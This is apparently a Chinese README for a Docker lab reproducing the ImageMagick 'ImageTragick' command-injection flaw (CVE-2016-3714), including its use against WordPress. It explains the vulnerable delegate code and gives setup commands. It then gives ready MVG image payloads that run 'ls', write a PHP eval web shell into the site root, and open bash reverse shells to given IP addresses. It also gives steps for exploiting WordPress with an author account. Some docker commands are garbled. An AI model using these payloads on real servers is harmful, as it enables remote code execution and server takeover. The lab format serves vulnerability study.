

##wordpress基于ImageMagick 命令执行漏洞（CVE-2016–3714）环境

### 漏洞信息

  ImageMagick 5.30 曝出 CVE-2016-3714，Java、PHP 的库也受其影响。其中 PHP 的库 Imagick 应用广泛，波及也大。Wordpress 也就是受此漏洞影响出现了 RCE.
  Wordpress 在图像处理的时候默认优先选择 Imagick Library
通过对/wp-includes/media.php 代码审计，发现几个函数在调用Imagick类。（_wp_image_editor_choose ，wp_get_image_editor，wp_crop_image ）

###Poc使用

####wordpress下测试

有最小的author权限即可，插入一个正常图片，用firebug获取他的post_id,
图片编辑，原始图片编辑，copy as curl.
传入带有攻击性的图片：
内容：push graphic-context
     viewbox 0 0 640 480
     fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/127.0.0.1/2333 0>&1")'
     pop graphic-context
编辑图片，同上，获取它的_ajax_nonce和post_id
修改正常图片的curl中的_ajax_nonce和post_id 
在主机上测试，会弹出一个shell
## ImageMagick 命令执行漏洞（CVE-2016–3714）环境

### 漏洞信息

   5月3日，ImageMagick官方披露称，目前ImageMagick存在一处远程命令执行漏洞（CVE-2016–3714），当其处理的上传图片带有攻击代码时，可被远程执行任意代码，进而导致攻击者控制服务器。

  ImageMagick是一款开源图片处理库，支持 PHP、Ruby、NodeJS 和 Python 等多种语言，使用非常广泛。包括 PHP imagick、Ruby rmagick 和 paperclip 以及 NodeJS imagemagick 等多个图片处理插件都依赖它运行。

### 漏洞相关代码

  ImageMagick 在 `MagickCore/constitute.c` 的 `ReadImage` 函数中解析图片，如果图片地址是 `https://` 开头的，即调用 InvokeDelegate。

`MagickCore/delegate.c`定义了委托，[第 99 行](https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L99)定义了要执行的命令。

```
99    "  <delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>"
```

   最终 `InvokeDelegate` 调用 [`ExternalDelegateCommand` 执行命令] (https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L407)

```
#if !defined(MAGICKCORE_HAVE_EXECVP)
  status=system(sanitize_command);
#else
  if ((asynchronous != MagickFalse) ||
      (strpbrk(sanitize_command,"&;<>|") != (char *) NULL))
    status=system(sanitize_command);
  else
    {
      pid_t
        child_pid;

```

### 镜像信息

本镜像中提供了本地测试 PoC 和 远程测试 PoC

### 获取环境:
1. 环境准备
```
yum -y install docker-io
yum install ImageMagick
yum install ImageMagick
yum install ImageMagick-devel
yum install php-pear
yum -y install php-devel
yum install gcc
pecl install imagick                         （这个之内在php 5.3的版本以上才能安装成功）
echo extension=imagick.so >> /etc/php.ini   （这个是将ImageMagick加载到php中）

 ```
1. 拉取镜像到本地
```
docker pull mysql
docker pull wordpress

 ```
2. 启动环境

 ```
docker run --name mysql_name -e MYSQL_ROOT_PASSWORD=wordpress -d mysql
docker?run?--name?wordpress_name?--  link?mysql:mysql?-d?wordpress 
docker run --name docker_wordpress --link mysql_wordpress :mysql -p 8080:80 -d wordpress

 ```
 > `-p 8080:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

### PoC使用

#### 本地测试

在容器中 `/poc.png` 文件内容如下：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evalbug.com/"|ls -la")'
pop graphic-context
```

构建时已经集成在容器中，可手动修改第 3 行的命令。

在物理机上直接执行下面命令验证漏洞：

```
$ docker exec i_imagemagick_1 convert /poc.png 1.png
```

或进入 docker容器 shell 中执行：

```
$ convert /poc.png 1.png
```

如果看到 `ls -al` 命令成功执行，则存在漏洞。

#### 远程命令执行测试

远程命令执行无回显，可通过写文件或者反弹 shell 来验证漏洞存在。

1. 写一句话到网站根目录下：

 ```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/1.jpg"|echo \'<?php eval($_POST[\'ant\']);?>\' > shell.php")'
pop graphic-context
 ```

2. 反弹 shell:

 ```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.101/2333 0>&1")'
pop graphic-context
 ```
